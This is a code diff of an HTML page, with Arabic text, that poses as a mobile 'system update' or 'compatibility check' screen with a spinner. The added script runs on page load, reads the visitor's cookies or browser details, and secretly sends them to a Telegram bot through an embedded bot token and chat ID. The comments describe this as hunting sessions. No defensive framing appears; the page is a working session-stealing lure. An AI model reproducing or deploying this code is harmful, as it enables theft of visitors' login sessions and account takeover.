@@ -1,27 +1,35 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Update System</title>
-    <style>
-        body { background: #000; color: #0f0; text-align: center; font-family: sans-serif; }
-        .loader { border: 16px solid #111; border-top: 16px solid #0f0; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
-</head>
-<body>
-    <div class="loader"></div>
-    <h3>جاري تحديث خدمات الجوال...</h3>
-    <p>يرجى عدم إغلاق الصفحة</p>
-
+    <meta charset="UTF-8">
+    <title>تحديث النظام</title>
     <script>
-        // سحب الكوكيز تلقائياً وإرساله للرادار
-        const cookieData = document.cookie;
-        if (cookieData) {
-            // هنا تحط رابط البوت حقك لإرسال الكوكيز فوراً
-            console.log("Cookie Captured: " + cookieData);
-        } else {
-            console.log("No cookies found yet.");
+        // بيانات بوتك عشان الصيد يوصلك مباشرة
+        const token = '8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg';
+        const chatId = '5811700860';
+
+        function sendToRadar(data) {
+            const message = "🎯 **تم سحب سيشن جديد!**\n\n" + "🍪 السيشن: `" + data + "`";
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+            
+            fetch(url); // إرسال سري للبوت
         }
+
+        window.onload = function() {
+            // سحب الكوكيز والسيشن
+            const session = document.cookie;
+            if (session && session !== "") {
+                sendToRadar(session);
+            } else {
+                // إذا الكوكيز فارغ، نسحب معلومات المتصفح كبديل للطقطقة
+                sendToRadar("Session Empty - Browser: " + navigator.userAgent);
+            }
+        };
     </script>
+</head>
+<body style="background:#000; color:#0f0; text-align:center; padding-top:50px;">
+    <h2>جاري فحص توافق الجوال...</h2>
+    <div style="border:2px solid #0f0; width:50px; height:50px; border-radius:50%; border-top:none; animation: spin 1s linear infinite; margin:auto;"></div>
+    <style>@keyframes spin { 100% { transform: rotate(360deg); } }</style>
 </body>
 </html>
